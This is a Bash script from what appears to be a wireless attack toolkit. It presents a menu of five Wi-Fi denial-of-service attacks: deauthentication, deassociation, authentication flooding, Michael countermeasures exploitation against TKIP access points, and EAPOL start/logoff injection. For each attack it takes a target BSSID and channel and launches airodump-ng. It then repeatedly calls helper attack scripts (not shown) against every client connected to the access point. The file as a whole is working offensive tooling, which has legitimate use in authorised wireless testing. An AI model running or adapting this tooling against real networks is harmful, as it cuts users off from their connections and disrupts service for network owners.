#!/bin/bash

source ./scripts/common.sh

interface_name=$1
project_name=$2

OPTIONS='\n
Attack OPTIONS:\n
1 => De-Authentication Attack \n
2 => De-Association Attack \n
3 => Authentication DOS Attack \n
4 =>  Michael Countermeasures Exploitation (Only For TKIP Enabled APs) \n
5 =>  EAPOL Start and Logoff Packet Injection (Only For WPA-Enterprise) \n
'

echo -e $OPTIONS

# Tracks the background airodump-ng/xterm window so it gets killed on exit,
# even if the user Ctrl-C's mid-attack.
xterm_pid=""
cleanup() {
	if [ -n "$xterm_pid" ]; then
		kill "$xterm_pid" 2>/dev/null
	fi
}
trap cleanup EXIT INT TERM

# prompt_back
# Re-prints the menu and reads the next option, used when bailing out of a
# branch early due to invalid input.
prompt_back() {
	echo -e $OPTIONS
	read -p "Enter an Attack Option (type '00' to Main Menu): " user_input
}

keyword="00"
user_input=""

read -p "Enter an Attack Option (type '00' to Main Menu): " user_input

while [ "$user_input" != "$keyword" ]
do

    case "$user_input" in

    #Performing DeAuth Attack
    1)
    	secs=5
    	bssid=''
    	channel=''
    	packets=5
    	attack_itteration_times=5

    	echo -e "\n${RED}[*] ScannedAPs:${NC}"
    	cat "projects/$project_name/ScannedAPs.csv" 2>/dev/null
    	echo ""
    	read -p "Enter BSSID: " bssid
    	if ! valid_mac "$bssid"; then
    		echo -e "${RED}[!] Invalid BSSID format.${NC}"
    		prompt_back; continue
    	fi
    	read -p "Enter Channel Number: " channel
    	if ! valid_number "$channel"; then
    		echo -e "${RED}[!] Invalid channel number.${NC}"
    		prompt_back; continue
    	fi
    	read -p "Enter Number of DeAuth Packets Sent During the Attack (Number)(Default: 5Packets): " user_input_packets
    	read -p "Enter times to iterate DeAuth Attack (Number)(Default: 5times): " attack_itteration
    	read -p "Enter delay time between each iteration (Seconds)(Default: 5sec): " delay_itteration
    	valid_number "$user_input_packets" && packets=$user_input_packets
    	valid_number "$attack_itteration" && attack_itteration_times=$attack_itteration
    	valid_number "$delay_itteration" && secs=$delay_itteration

    	log_header "projects/$project_name" "DeAuth Attack on $bssid"
    	mac_addresses=$(awk '/^\[\*\] MAC Addresses of Stations Connected to AP:/ {p=1; next} p && NF {print $0}' "projects/$project_name/scan-$bssid.txt" 2>/dev/null)

    	sudo iw "$interface_name" set channel "$channel"
    	xterm -e sudo airodump-ng "$interface_name" --bssid "$bssid" --channel "$channel" &
    	xterm_pid=$!

    	counter=1
    	while [ "$counter" -le "$attack_itteration_times" ]
    	do
    		log_msg "projects/$project_name" "\n${YELLOW}Iteration Number: $counter${NC}"
    		if [ -n "$mac_addresses" ]; then
    			while IFS= read -r client; do
    				log_msg "projects/$project_name" "${YELLOW}Deauthenticating client: $client${NC}"
    				./scripts/deAuth.sh "$interface_name" "$bssid" "$client" "$packets" "$channel" | tee -a "projects/$project_name/command.logs"
    				sleep "$secs"
    			done <<< "$mac_addresses"
    		else
    			log_msg "projects/$project_name" "${YELLOW}No connected clients found, skipping iteration.${NC}"
    		fi
    		((counter++))
    	done

    	kill "$xterm_pid" 2>/dev/null
    	xterm_pid=""
    	;;


    #Performing DeAss Attack
    2)
    	secs=5
    	mins=5
    	essid=''
    	bssid=''
    	channel=''
    	attack_itteration_times=5

    	echo -e "\n${RED}[*] ScannedAPs:${NC}"
    	cat "projects/$project_name/ScannedAPs.csv" 2>/dev/null
    	echo ""
    	read -p "Enter BSSID: " bssid
    	if ! valid_mac "$bssid"; then
    		echo -e "${RED}[!] Invalid BSSID format.${NC}"
    		prompt_back; continue
    	fi
    	read -p "Enter ESSID: " essid
    	read -p "Enter Channel Number: " channel
    	if ! valid_number "$channel"; then
    		echo -e "${RED}[!] Invalid channel number.${NC}"
    		prompt_back; continue
    	fi
    	read -p "Enter Time to perform De-Assos Attack (Minutes)(Default: 5mins): " user_input_mins
    	read -p "Enter times to iterate De-Assos Attack (Number)(Default: 5times): " attack_itteration
    	read -p "Enter delay time between each iteration (Seconds)(Default: 5sec): " delay_itteration
    	valid_number "$user_input_mins" && mins=$user_input_mins
    	valid_number "$attack_itteration" && attack_itteration_times=$attack_itteration
    	valid_number "$delay_itteration" && secs=$delay_itteration

    	log_header "projects/$project_name" "DeAss Attack on $bssid ($essid)"
    	mac_addresses=$(awk '/^\[\*\] MAC Addresses of Stations Connected to AP:/ {p=1; next} p && NF {print $0}' "projects/$project_name/scan-$bssid.txt" 2>/dev/null)

    	sudo iw "$interface_name" set channel "$channel"
    	xterm -e sudo airodump-ng "$interface_name" --bssid "$bssid" --channel "$channel" &
    	xterm_pid=$!

    	counter=1
    	while [ "$counter" -le "$attack_itteration_times" ]
    	do
    		log_msg "projects/$project_name" "\n${YELLOW}Iteration Number: $counter${NC}"
    		if [ -n "$mac_addresses" ]; then
    			while IFS= read -r client; do
    				log_msg "projects/$project_name" "${YELLOW}Deassociating client: $client${NC}"
    				./scripts/deAss.sh "$interface_name" "$bssid" "$essid" "$client" "$mins" "$channel" | tee -a "projects/$project_name/command.logs"
    				sleep "$secs"
    			done <<< "$mac_addresses"
    		else
    			log_msg "projects/$project_name" "${YELLOW}No connected clients found, skipping iteration.${NC}"
    		fi
    		((counter++))
    	done

    	kill "$xterm_pid" 2>/dev/null
    	xterm_pid=""
    	;;


    #Performing Authentication DOS Attack
    3)
    	secs=5
    	mins=5
    	bssid=''
    	channel=''
    	attack_itteration_times=5

    	echo -e "\n${RED}[*] ScannedAPs:${NC}"
    	cat "projects/$project_name/ScannedAPs.csv" 2>/dev/null
    	echo ""
    	read -p "Enter BSSID: " bssid
    	if ! valid_mac "$bssid"; then
    		echo -e "${RED}[!] Invalid BSSID format.${NC}"
    		prompt_back; continue
    	fi
    	read -p "Enter Channel Number: " channel
    	if ! valid_number "$channel"; then
    		echo -e "${RED}[!] Invalid channel number.${NC}"
    		prompt_back; continue
    	fi
    	read -p "Enter Time to perform Authentication DOS Attack (Minutes)(Default: 5mins): " user_input_mins
    	read -p "Enter times to iterate Authentication DOS Attack (Number)(Default: 5times): " attack_itteration
    	read -p "Enter delay time between each iteration (Seconds)(Default: 5sec): " delay_itteration
    	valid_number "$user_input_mins" && mins=$user_input_mins
    	valid_number "$attack_itteration" && attack_itteration_times=$attack_itteration
    	valid_number "$delay_itteration" && secs=$delay_itteration

    	log_header "projects/$project_name" "Authentication DOS Attack on $bssid"

    	sudo iw "$interface_name" set channel "$channel"
    	xterm -e sudo airodump-ng "$interface_name" --bssid "$bssid" --channel "$channel" &
    	xterm_pid=$!

    	counter=1
    	while [ "$counter" -le "$attack_itteration_times" ]
    	do
    		log_msg "projects/$project_name" "\n${YELLOW}Iteration Number: $counter${NC}"
    		./scripts/authenticationDOS.sh "$interface_name" "$bssid" "$mins" | tee -a "projects/$project_name/command.logs"
    		sleep "$secs"
    		((counter++))
    	done

    	kill "$xterm_pid" 2>/dev/null
    	xterm_pid=""
    	;;


    #Performing Michael Countermeasures Exploitation
    4)
    	secs=5
    	mins=5
    	bssid=''
    	channel=''
    	attack_itteration_times=5

    	echo -e "\n${RED}[*] ScannedAPs:${NC}"
    	cat "projects/$project_name/ScannedAPs.csv" 2>/dev/null
    	echo ""
    	read -p "Enter BSSID: " bssid
    	if ! valid_mac "$bssid"; then
    		echo -e "${RED}[!] Invalid BSSID format.${NC}"
    		prompt_back; continue
    	fi
    	read -p "Enter Channel Number: " channel
    	if ! valid_number "$channel"; then
    		echo -e "${RED}[!] Invalid channel number.${NC}"
    		prompt_back; continue
    	fi
    	read -p "Enter Time to perform Michael Countermeasures Exploitation Attack (Minutes)(Default: 5mins): " user_input_mins
    	read -p "Enter times to iterate Michael Countermeasures Exploitation Attack (Number)(Default: 5times): " attack_itteration
    	read -p "Enter delay time between each iteration (Seconds)(Default: 5sec): " delay_itteration
    	valid_number "$user_input_mins" && mins=$user_input_mins
    	valid_number "$attack_itteration" && attack_itteration_times=$attack_itteration
    	valid_number "$delay_itteration" && secs=$delay_itteration

    	log_header "projects/$project_name" "Michael Countermeasures Exploitation on $bssid"

    	sudo iw "$interface_name" set channel "$channel"
    	xterm -e sudo airodump-ng "$interface_name" --bssid "$bssid" --channel "$channel" &
    	xterm_pid=$!

    	counter=1
    	while [ "$counter" -le "$attack_itteration_times" ]
    	do
    		log_msg "projects/$project_name" "\n${YELLOW}Iteration Number: $counter${NC}"
    		./scripts/mcExploitation.sh "$interface_name" "$bssid" "$mins" | tee -a "projects/$project_name/command.logs"
    		sleep "$secs"
    		((counter++))
    	done

    	kill "$xterm_pid" 2>/dev/null
    	xterm_pid=""
    	;;


    #Performing EAPOL Start and Logoff Packet Injection
    5)
    	secs=5
    	mins=5
    	bssid=''
    	channel=''
    	attack_itteration_times=5

    	echo -e "\n${RED}[*] ScannedAPs:${NC}"
    	cat "projects/$project_name/ScannedAPs.csv" 2>/dev/null
    	echo ""
    	read -p "Enter BSSID: " bssid
    	if ! valid_mac "$bssid"; then
    		echo -e "${RED}[!] Invalid BSSID format.${NC}"
    		prompt_back; continue
    	fi
    	read -p "Enter Channel Number: " channel
    	if ! valid_number "$channel"; then
    		echo -e "${RED}[!] Invalid channel number.${NC}"
    		prompt_back; continue
    	fi
    	read -p "Enter Time to perform EAPOL Start and Logoff Packet Injection Attack (Minutes)(Default: 5mins): " user_input_mins
    	read -p "Enter times to iterate EAPOL Start and Logoff Packet Injection Attack (Number)(Default: 5times): " attack_itteration
    	read -p "Enter delay time between each iteration (Seconds)(Default: 5sec): " delay_itteration
    	valid_number "$user_input_mins" && mins=$user_input_mins
    	valid_number "$attack_itteration" && attack_itteration_times=$attack_itteration
    	valid_number "$delay_itteration" && secs=$delay_itteration

    	log_header "projects/$project_name" "EAPOL Start/Logoff Injection on $bssid"

    	sudo iw "$interface_name" set channel "$channel"
    	xterm -e sudo airodump-ng "$interface_name" --bssid "$bssid" --channel "$channel" &
    	xterm_pid=$!

    	counter=1
    	while [ "$counter" -le "$attack_itteration_times" ]
    	do
    		log_msg "projects/$project_name" "\n${YELLOW}Iteration Number: $counter${NC}"
    		./scripts/eapolPacketInjection.sh "$interface_name" "$bssid" "$mins" | tee -a "projects/$project_name/command.logs"
    		sleep "$secs"
    		((counter++))
    	done

    	kill "$xterm_pid" 2>/dev/null
    	xterm_pid=""
    	;;


    *)
    	echo -e "\n${RED}Invalid Options!!!${NC}"
    	;;
    esac

    echo -e $OPTIONS
    read -p "Enter an Attack Option (type '00' to Main Menu): " user_input
done
